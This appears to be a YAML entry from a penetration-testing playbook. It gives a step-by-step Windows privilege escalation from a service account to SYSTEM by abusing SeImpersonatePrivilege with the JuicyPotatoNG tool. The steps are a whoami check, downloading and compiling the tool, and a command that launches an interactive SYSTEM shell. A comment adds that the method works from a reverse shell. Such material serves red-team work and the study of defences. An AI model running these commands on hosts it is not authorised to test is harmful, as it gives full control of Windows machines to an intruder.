title: SeImpersonatePrivilege Privilege Escalation - JuicyPotato
category: 
  - AD:
    - Privilege Escalation:
      - Host
tactic: Privilege Escalation
tags: []
description: Windows Local Privilege Escalation from Service Account to System

references:
  - https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/
  - https://github.com/antonioCoco/JuicyPotatoNG

steps:
  - description: Confirm your user has SeImpersonatePrivilege
    options:
      - tool: whoami.exe
        usage: whoami /all
        comments:

  - description: Download and compile JuicyPotatoNG
    options:
      - tool: hands
        usage: Download and compile from https://github.com/antonioCoco/JuicyPotatoNG
        comments:
  
  - description: Execute 
    options:
      - tool: JuicyPotatoNG.exe
        usage: ./JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -i
        comments: It works like a charm even in a reverse shell!

comments:
  